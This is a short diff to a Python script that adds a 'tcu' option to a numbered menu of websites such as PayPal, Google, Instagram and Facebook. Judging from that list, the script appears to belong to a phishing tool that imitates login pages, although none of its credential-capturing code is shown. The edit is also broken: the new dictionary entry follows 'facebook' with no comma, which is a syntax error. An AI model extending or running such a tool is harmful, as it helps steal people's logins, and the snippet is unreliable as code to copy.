@@ -26,13 +26,14 @@ sites = {
     "21": "yahoo",
     "22": "steam",
     "23": "facebook"
+    "24": "tcu"
 }
 
 print("Website options:")
 print("[1]  Adobe               [11] Netflix            [21] Yahoo")
 print("[2]  Badoo               [12] PayPal             [22] Steam")
 print("[3]  DevianArt           [13] Pinterest          [23] Facebook")
-print("[4]  Google              [14] Shopify")
+print("[4]  Google              [14] Shopify            [24] tcu")
 print("[5]  Instafollowers      [15] Spotify")
 print("[6]  Instagram           [16] Twitch")
 print("[7]  LinkedIn            [17] Twitter")
